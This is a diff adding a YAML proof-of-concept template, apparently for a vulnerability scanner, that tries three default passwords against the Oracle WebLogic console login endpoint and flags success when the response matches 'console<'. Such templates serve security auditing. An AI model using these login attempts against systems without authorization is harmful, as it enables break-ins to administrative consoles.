@@ -1,0 +1,29 @@
+name: poc-yaml-weblogic-console-弱口令
+description: |
+  弱口令weblogic\weblogic、Oracle@123、weblogic123
+matchCount: 1
+rules: 
+  - method: POST
+    path: /console/j_security_check
+    headers:
+      Content-type: application/x-www-form-urlencoded
+    body: |
+      j_username=weblogic&j_password=weblogic&j_character_encoding=UTF-8
+    expression: 
+      body_any: ["console<"]
+  - method: POST
+    path: /console/j_security_check
+    headers:
+      Content-type: application/x-www-form-urlencoded
+    body: |
+      j_username=weblogic&j_password=Oracle@123&j_character_encoding=UTF-8
+    expression: 
+      body_any: ["console<"]    
+  - method: POST
+    path: /console/j_security_check
+    headers:
+      Content-type: application/x-www-form-urlencoded
+    body: |
+      j_username=weblogic&j_password=weblogic123&j_character_encoding=UTF-8
+    expression: 
+      body_any: ["console<"]
